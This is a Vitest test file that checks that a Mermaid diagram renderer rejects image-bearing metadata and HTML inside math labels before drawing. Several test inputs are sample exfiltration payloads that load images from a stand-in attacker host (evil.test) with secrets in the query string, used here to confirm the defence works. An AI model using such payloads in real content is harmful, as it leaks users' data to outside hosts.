// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import mermaid from "mermaid";
import { renderMermaid } from "./mermaid-renderer";

// Only browser geometry and network loading are shimmed; Mermaid parsing/drawing is real.
beforeEach(() => {
  Object.defineProperty(SVGElement.prototype, "getBBox", {
    configurable: true,
    value: () => ({ x: 0, y: 0, width: 80, height: 30 }),
  });
  Object.defineProperty(SVGElement.prototype, "getComputedTextLength", {
    configurable: true,
    value: () => 80,
  });
});
afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  document.body.replaceChildren();
});

it("rejects image metadata before drawing and does not block the next diagram on decode", async () => {
  const sources: string[] = [];
  let releaseDecode = () => {};
  let imageRequested = () => {};
  const requested = new Promise<void>((resolve) => {
    imageRequested = resolve;
  });
  const pendingDecode = new Promise<void>((resolve) => {
    releaseDecode = resolve;
  });
  vi.stubGlobal(
    "Image",
    class {
      naturalWidth = 20;
      naturalHeight = 20;
      set src(value: string) {
        sources.push(value);
        imageRequested();
      }
      decode() {
        return pendingDecode;
      }
    }
  );
  const normal = "sequenceDiagram\n Alice->>Bob: Hello";
  expect(await renderMermaid(normal, false)).not.toBeNull();
  const first = renderMermaid(
    'flowchart LR\n A@{ img: "https://evil.test/pixel?secret=example" }',
    false
  );
  const next = renderMermaid(normal, false);
  try {
    const outcome = await Promise.race([
      first.then(() => "settled"),
      requested.then(() => "requested"),
    ]);
    expect(outcome).toBe("settled");
    expect(sources).toEqual([]);
    expect(await first).toBeNull();
    expect(await next).not.toBeNull();
  } finally {
    releaseDecode();
    await Promise.all([first, next]);
  }
});

it.each([
  'flowchart LR\n A@{ "img": "pixel" }',
  'flowchart LR\n A@{ "\\u0069mg": "pixel" }',
  'sequenceDiagram\n participant Alice\n properties Alice: {"icon":"pixel"}\n Alice->>Bob: Hello',
])("rejects resource-bearing metadata before Mermaid draws: %s", async (source) => {
  const draw = vi.spyOn(mermaid, "render");
  expect(await renderMermaid(source, false)).toBeNull();
  expect(draw).not.toHaveBeenCalled();
});

it("continues rendering resource-free metadata", async () => {
  const draw = vi.spyOn(mermaid, "render");
  expect(
    await renderMermaid('flowchart LR\n A@{ shape: rect, label: "Safe" } --> B', false)
  ).not.toBeNull();
  expect(draw).toHaveBeenCalledOnce();
});

it("preserves readable math source without drawing unsupported labels", async () => {
  const render = vi.spyOn(mermaid, "render");
  const result = await renderMermaid("sequenceDiagram\n Alice->>Bob: $$x^2$$", false);
  expect(render).not.toHaveBeenCalled();
  expect(result).toBeNull();
});

it.each([
  'Alice->>Bob: $$x$$ <img src="https://evil.test/leak?d=SECRET">',
  'Note over Alice: $$x$$ <img src="https://evil.test/leak?d=SECRET">',
])("rejects math HTML before it inserts images into the document: %s", async (line) => {
  const images: HTMLImageElement[] = [];
  const observeImages = (records: MutationRecord[]) => {
    for (const record of records) {
      for (const node of record.addedNodes) {
        if (!(node instanceof Element)) continue;
        if (node instanceof HTMLImageElement) images.push(node);
        images.push(...node.querySelectorAll("img"));
      }
    }
  };
  const observer = new MutationObserver(observeImages);
  // Include Mermaid's temporary measurement nodes outside the render host.
  observer.observe(document, { childList: true, subtree: true });
  const draw = vi.spyOn(mermaid, "render");
  try {
    expect(await renderMermaid(`sequenceDiagram\n ${line}`, false)).toBeNull();
    observeImages(observer.takeRecords());
    expect(images.map((image) => image.getAttribute("src"))).toEqual([]);
    expect(draw).not.toHaveBeenCalled();
  } finally {
    observer.disconnect();
  }
});
